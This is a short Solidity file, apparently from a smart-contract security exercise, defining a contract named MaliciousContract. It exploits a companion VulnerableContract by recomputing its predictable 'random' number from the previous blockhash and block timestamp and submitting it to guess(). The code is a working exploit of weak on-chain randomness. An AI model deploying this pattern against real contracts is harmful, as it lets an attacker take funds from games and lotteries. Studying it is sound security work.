// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract {
    receive() external payable {}

    function attack(VulnerableContract vulnerable) public {
        vulnerable.guess(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );
    }
}
